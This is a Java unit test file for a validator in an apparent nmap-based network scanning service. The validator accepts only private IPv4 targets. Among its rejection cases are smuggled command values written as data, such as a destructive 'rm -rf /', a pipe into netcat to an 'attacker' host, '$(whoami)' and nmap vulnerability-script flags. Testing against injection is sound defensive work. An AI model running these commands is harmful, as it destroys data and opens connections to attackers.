package com.portscape.scan;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.time.Duration;
import java.util.List;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;

import com.portscape.config.NmapProperties;
import com.portscape.scan.exception.InvalidTargetException;

class TargetValidatorTest {

    private static TargetValidator validatorWithMinPrefix(Integer minPrefix) {
        return new TargetValidator(new NmapProperties(List.of("/usr/bin/nmap"),
                "192.168.1.0/24", List.of(), minPrefix, Duration.ofMinutes(10), Duration.ofSeconds(60)));
    }

    private final TargetValidator validator = validatorWithMinPrefix(null);

    @ParameterizedTest(name = "aceita {0} -> {1}")
    @CsvSource({
            "192.168.1.0/24,  192.168.1.0/24",
            "10.0.0.0/24,     10.0.0.0/24",
            "172.16.0.0/16,   172.16.0.0/16",
            "172.31.5.0/24,   172.31.5.0/24",
            "127.0.0.1,       127.0.0.1",
            "192.168.1.10,    192.168.1.10"
    })
    void acceptsPrivateNetworks(String input, String expected) {
        assertThat(validator.validate(input)).isEqualTo(expected);
    }

    @Test
    void normalisesToTheNetworkAddress() {
        // A fase 2 vai comparar scans pela subnet: 1.7/24 e 1.0/24 tem de dar o mesmo.
        assertThat(validator.validate("192.168.1.7/24")).isEqualTo("192.168.1.0/24");
    }

    @Test
    void acceptsPaddingWhitespace() {
        assertThat(validator.validate("  192.168.1.0/24  ")).isEqualTo("192.168.1.0/24");
    }

    @ParameterizedTest(name = "recusa a rede publica {0}")
    @ValueSource(strings = {
            "8.8.8.8",
            "1.1.1.1/24",
            "172.32.0.0/16",   // logo acima do bloco 172.16/12
            "172.15.0.0/16",   // logo abaixo
            "192.169.1.0/24",  // logo acima de 192.168/16
            "11.0.0.0/24",
            "0.0.0.0/16"
    })
    void rejectsPublicNetworks(String target) {
        assertThatThrownBy(() -> validator.validate(target))
                .isInstanceOf(InvalidTargetException.class)
                .hasMessageContaining("rede privada");
    }

    @ParameterizedTest(name = "recusa a injecao de argumentos {0}")
    @ValueSource(strings = {
            "--script=vuln",
            "-oN /tmp/out",
            "192.168.1.1 --script=http-vuln-cve2017-5638",
            "192.168.1.1; rm -rf /",
            "192.168.1.1|nc attacker 4444",
            "$(whoami)",
            "scanme.nmap.org",
            "192.168.1.1/24/24",
            "192.168.1"
    })
    void rejectsAnythingThatIsNotAnIpv4Target(String target) {
        assertThatThrownBy(() -> validator.validate(target))
                .isInstanceOf(InvalidTargetException.class)
                .hasMessageContaining("Target invalido");
    }

    @Test
    void rejectsOctetsAbove255() {
        assertThatThrownBy(() -> validator.validate("192.168.1.256"))
                .isInstanceOf(InvalidTargetException.class)
                .hasMessageContaining("Octeto");
    }

    @ParameterizedTest(name = "recusa o prefixo {0}")
    @ValueSource(strings = {"10.0.0.0/8", "10.0.0.0/0", "192.168.1.0/33"})
    void rejectsPrefixesOutsideTheAllowedRange(String target) {
        assertThatThrownBy(() -> validator.validate(target))
                .isInstanceOf(InvalidTargetException.class);
    }

    @ParameterizedTest
    @NullAndEmptySource
    @ValueSource(strings = {"   "})
    void rejectsBlankTarget(String target) {
        assertThatThrownBy(() -> validator.validate(target))
                .isInstanceOf(InvalidTargetException.class)
                .hasMessageContaining("vazio");
    }

    @Test
    @DisplayName("a configuracao pode apertar o prefixo minimo, para nao se pedir um scan que nunca acaba")
    void honoursATighterMinimumPrefixFromConfiguration() {
        TargetValidator strict = validatorWithMinPrefix(24);

        assertThat(strict.validate("192.168.1.0/24")).isEqualTo("192.168.1.0/24");
        assertThatThrownBy(() -> strict.validate("192.168.0.0/16"))
                .isInstanceOf(InvalidTargetException.class)
                .hasMessageContaining("/24");
    }

    @Test
    @DisplayName("a configuracao NAO pode alargar abaixo de /16 -- e ai que assenta a garantia de rede privada")
    void refusesToWidenBelowTheSafetyFloor() {
        // 10.0.0.0/7 comeca num bloco privado mas inclui o 11.x, que e publico.
        TargetValidator tooPermissive = validatorWithMinPrefix(4);

        assertThatThrownBy(() -> tooPermissive.validate("10.0.0.0/7"))
                .isInstanceOf(InvalidTargetException.class)
                .hasMessageContaining("Prefixo invalido");
    }
}
